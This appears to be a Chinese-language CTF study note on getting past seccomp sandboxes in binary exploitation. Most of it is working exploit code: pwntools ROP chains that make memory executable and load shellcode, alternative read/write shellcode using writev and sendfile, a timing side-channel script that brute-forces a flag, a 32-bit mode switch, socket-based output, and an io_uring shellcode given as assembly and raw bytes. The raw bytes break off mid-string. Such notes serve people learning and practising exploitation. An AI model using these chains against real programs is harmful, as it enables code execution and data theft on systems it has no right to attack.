<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c1"># 注意flag输出不在开头
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">'''</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
</span><span class="sh">'''</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">writev</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">)</span>


<span class="c1"># 注意flag输出不在开头
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
mov rdi, 1
mov rsi, rsp
mov rdx, 0x1
mov rax, 0x14
syscall
</span><span class="sh">"""</span>   <span class="c1"># write
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="sendfile-1">sendfile</h4>

<p><strong>sendfile可以直接代替write与read</strong></p>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rcx</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">sendfile</span><span class="sh">"</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">rax</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 0x100
mov rax, 0x28
syscall
</span><span class="sh">"""</span> 
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="侧信道攻击">侧信道攻击</h4>

<blockquote>
  <p>这个攻击比较特殊，实在没有输出手段的时候就利用此方法，此方法相当不准确，谨慎使用。</p>
</blockquote>

<blockquote>
  <p>如果rop同上面一样使用</p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>

  <p>来转化成写shellcode</p>
</blockquote>

<p>接下来看shellcode怎么写。</p>

<p><img src="/assets/image/2025-08-01-my-second-post.assets/3458477-20250416202329599-36135792.png" alt="image" /></p>

<p>现在假设flag已经读到了栈上，但是没有办法读（没有系统调用 &amp; close(1)）。</p>

<p>那么可以进行爆破，因为没有返回，所以爆破就只能看时间来判断。</p>

<blockquote>
  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="n">flag</span> <span class="o">=</span> <span class="sh">''</span>
<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
<span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x80</span><span class="p">):</span>
  <span class="n">sh</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shellcode</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">shell</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="sh">"""</span><span class="s">
      infinite_loop: 
      cmp byte ptr[rsp+{}], {}
      je infinite_loop
          </span><span class="sh">"""</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset</span><span class="p">),</span><span class="nf">str</span><span class="p">(</span><span class="n">byte</span><span class="p">)))</span>
  <span class="n">sh</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">shellcode: </span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span><span class="n">shell</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
      <span class="n">sh</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
      <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
      <span class="nf">print</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="sh">"</span><span class="s">---</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">byte</span><span class="p">))</span>
      <span class="n">sh</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
      <span class="k">break</span>
  <span class="k">except</span><span class="p">:</span>
      <span class="k">pass</span>

  <span class="nf">print</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="sh">"</span><span class="s">---</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">byte</span><span class="p">))</span>
  <span class="n">sh</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>

  <p>shellcode为读取文件的code。</p>
</blockquote>

<p><img src="/assets/image/2025-08-01-my-second-post.assets/3458477-20250416202339098-646922745.png" alt="image" /></p>

<blockquote>
  <p>很慢，但可行。</p>
</blockquote>

<h3 id="转32位">转32位</h3>

<p>利用条件</p>

<ul>
  <li>沙箱没有arch==ARCH_x86_64检测</li>
  <li>可以使用mmmap或者mprotect和32位的地址</li>
</ul>

<blockquote>
  <p><strong>rop</strong></p>

  <p>可以调用mprotect来转化成写shellcode</p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span>  <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre><span class="n">shellcode64</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">mmap</span><span class="p">(</span><span class="mh">0x700000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">shellcode64</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x700000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
<span class="n">shellcode64</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rsp,0x700800
mov DWORD PTR [rsp+4], 0x23
mov DWORD PTR [rsp], 0x700000
retfd
</span><span class="sh">"""</span>
<span class="n">shellcode32</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
push 0x67616C66
</span><span class="sh">"""</span>

<span class="n">shellcode32</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push esp
push 0
push 0
pop edx
pop ecx
pop ebx
push 5
pop eax
int 0x80
</span><span class="sh">"""</span>   <span class="c1"># open
</span>
<span class="n">shellcode32</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push eax
push esp
push 0x100
pop edx
pop ecx
add ecx, 0x20
pop ebx
push 3
pop eax
int 0x80
</span><span class="sh">"""</span>   <span class="c1"># read
</span><span class="n">shellcode32</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push 1
pop ebx
push 4
pop eax
int 0x80
</span><span class="sh">"""</span>   <span class="c1"># write
</span><span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode64</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">,</span> <span class="n">bits</span><span class="o">=</span><span class="mi">64</span><span class="p">))</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode32</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">i386</span><span class="sh">'</span><span class="p">,</span> <span class="n">bits</span><span class="o">=</span><span class="mi">32</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h3 id="绕过close1">绕过close(1)</h3>

<h4 id="侧信道攻击-1">侧信道攻击</h4>

<p>同write替代中的侧信道攻击</p>

<h4 id="远程链接socketconnect">远程链接socket&amp;connect</h4>

<p>有些程序会调用子进程，子进程对外开放，但是rop写后只能在主进程运行，输出没法显示在远程，或者<strong>close(1)</strong>，那么可以用此方法，此方法需要<strong>公网ip</strong>。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="n">serv_addr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
    <span class="n">serv_addr</span><span class="o">-&gt;</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">serv_addr</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>   <span class="c1">//填入ip地址和端口</span>
    <span class="n">serv_addr</span><span class="o">-&gt;</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">8888</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">%</span><span class="n">lp</span><span class="p">,</span><span class="o">*</span><span class="n">serv_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="opendevpts"><code class="language-plaintext highlighter-rouge">open("/dev/pts/?")</code></h4>

<p>使用<code class="language-plaintext highlighter-rouge">open("/dev/pts/?")</code>重新打开标准输出</p>

<h3 id="超级代码">超级代码</h3>

<p>这个代码利用了下面三个个系统调用</p>

<div class="language-armasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nl">9</span>	<span class="nb">common</span>	<span class="nv">mmap</span>			<span class="nv">__x64_sys_mmap</span>
<span class="nl">425</span>	<span class="nb">common</span>	<span class="nv">io_uring_setup</span>		<span class="nv">__x64_sys_io_uring_setup</span>
<span class="nl">426</span>	<span class="nb">common</span>	<span class="nv">io_uring_enter</span>		<span class="nv">__x64_sys_io_uring_enter</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>汇编如下</p>

<pre><code class="language-x86asm">push   r15
mov    ecx,0x1e
push   r14
push   r13
xor    r13d,r13d
push   r12
mov    eax,r13d
push   rbp
push   rbx
sub    rsp,0x68
lea    rdi,[rsp-0x10]
lea    rsi,[rsp-0x10]
rep stos DWORD PTR es:[rdi],eax
mov    edi,0x10
mov    eax,0x1a9
syscall
mov    ebx,0x9
mov    r12,rax
mov    r14d,eax
mov    r8d,eax
xor    r9d,r9d
mov    r10d,0x1
mov    edx,0x3
xor    edi,edi
mov    esi,0x1000
mov    eax,ebx
syscall
mov    r9d,0x8000000
mov    rbp,rax
mov    eax,ebx
syscall
mov    r9d,0x10000000
mov    r15,rax
mov    eax,ebx
syscall
mov    ecx,0x10
mov    rbx,rax
mov    rdi,rax
mov    eax,r13d
rep stos DWORD PTR es:[rdi],eax
mov    edi,r12d
mov    r12d,0x1aa
xor    r9d,r9d
xor    r8d,r8d
mov    edx,0x1
mov    esi,0x1
movabs rax,0xffffff9c00001012
mov    QWORD PTR [rbx],rax
lea    rax,[rip+0xc1]        # 0x7ffcf065b5c0
mov    QWORD PTR [rbx+0x10],rax
mov    eax,DWORD PTR [rsp+0x30]
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
mov    eax,DWORD PTR [rsp+0x54]
mov    rdi,rbx
mov    ecx,0x10
mov    edx,DWORD PTR [r15+rax*1+0x8]
mov    eax,r13d
lea    r15,[rsp-0x74]
rep stos DWORD PTR es:[rdi],eax
mov    BYTE PTR [rbx],0x16
mov    eax,DWORD PTR [rsp+0x30]
mov    edi,r14d
mov    DWORD PTR [rbx+0x4],edx
mov    edx,0x1
mov    QWORD PTR [rbx+0x10],r15
mov    DWORD PTR [rbx+0x18],0x64
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
mov    ecx,0x10
mov    eax,r13d
mov    rdi,rbx
mov    edx,0x3
rep stos DWORD PTR es:[rdi],eax
mov    QWORD PTR [rbx+0x10],r15
mov    edi,r14d
movabs rax,0x100000017
mov    QWORD PTR [rbx],rax
mov    eax,DWORD PTR [rsp+0x30]
mov    DWORD PTR [rbx+0x18],0x64
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
add    rsp,0x68
xor    eax,eax
pop    rbx
pop    rbp
pop    r12
pop    r13
pop    r14
pop    r15
ret
cs (bad)
</code></pre>

<p>机器码如下</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="err">'</span><span class="n">AW</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x1e</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00AVAUE1</span><span class="err">\</span><span class="n">xedATD</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe8USH</span><span class="err">\</span><span class="n">x83</span><span class="err">\</span><span class="n">xechH</span><span class="err">\</span><span class="n">x8d</span><span class="o">|</span><span class="err">$\</span><span class="n">xf0H</span><span class="err">\</span><span class="n">x8dt</span><span class="err">$\</span><span class="n">xf0</span><span class="err">\</span><span class="n">xf3</span><span class="err">\</span><span class="n">xab</span><span class="err">\</span><span class="n">xbf</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">xa9</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xbb</span><span class="err">\</span><span class="n">t</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00I</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc4A</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc6A</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc0E1</span><span class="err">\</span><span class="n">xc9A</span><span class="err">\</span><span class="n">xba</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xba</span><span class="err">\</span><span class="n">x03</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x001</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xbe</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xd8</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05A</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x08H</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc5</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xd8</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05A</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x10I</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc7</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xd8</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00H</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc3H</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xc7D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe8</span><span class="err">\</span><span class="n">xf3</span><span class="err">\</span><span class="n">xabD</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe7A</span><span class="err">\</span><span class="n">xbc</span><span class="err">\</span><span class="n">xaa</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00E1</span><span class="err">\</span><span class="n">xc9E1</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">xba</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xbe</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00H</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x12</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x9c</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xffH</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">x03H</span><span class="err">\</span><span class="n">x8d</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xc1</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00H</span><span class="err">\</span><span class="n">x89C</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$</span><span class="mi">0</span><span class="err">\</span><span class="n">xc7D</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$\</span><span class="n">x1c</span><span class="err">\</span><span class="n">xffD</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe0</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$</span><span class="n">TH</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xdf</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00A</span><span class="err">\</span><span class="n">x8bT</span><span class="err">\</span><span class="n">x07</span><span class="err">\</span><span class="n">x08D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe8L</span><span class="err">\</span><span 